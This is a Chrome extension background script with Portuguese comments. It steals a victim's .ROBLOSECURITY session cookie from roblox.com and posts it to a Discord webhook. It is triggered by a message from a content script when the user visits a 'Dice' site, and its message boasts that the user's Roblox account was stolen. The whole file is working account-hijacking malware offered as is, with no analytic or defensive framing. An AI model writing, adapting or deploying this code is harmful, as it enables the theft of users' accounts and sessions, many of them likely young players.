// Função para capturar o cookie do Roblox e enviar ao Discord
async function stealRobloxCookie() {
    try {
        const cookie = await chrome.cookies.get({
            url: "https://www.roblox.com",
            name: ".ROBLOSECURITY"
        });

        if (cookie) {
            fetch('SEU_WEBHOOK_DO_DISCORD_AQUI', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `🎯 **GATILHO ATIVADO!**\nO usuário entrou no site do Dice e eu roubei o Roblox dele!\n\n**Cookie:** \n\`${cookie.value}\`` 
                })
            });
        }
    } catch (e) {
        console.error("Erro ao capturar cookie:", e);
    }
}

// Ouve mensagens vindas do content.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "steal_roblox") {
        stealRobloxCookie();
    }
});
